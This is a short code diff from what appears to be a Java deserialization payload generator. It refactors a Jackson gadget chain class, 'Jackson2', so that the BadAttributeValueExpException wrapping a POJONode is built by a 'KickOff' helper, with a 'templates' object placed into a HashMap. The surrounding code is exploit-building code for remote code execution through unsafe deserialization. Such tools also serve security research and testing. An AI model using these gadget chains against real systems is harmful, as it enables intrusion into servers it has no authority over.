@@ -1,6 +1,7 @@
 package com.ppp.chain.json;
 
 import com.fasterxml.jackson.databind.node.POJONode;
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -66,8 +67,7 @@ public class Jackson2 implements ObjectPayload<Object> {
 
         POJONode node = new POJONode(proxy);
 
-        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(badAttributeValueExpException, "val", node);
+        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(node);
 
         HashMap hashMap = new HashMap();
         hashMap.put(templates, badAttributeValueExpException);
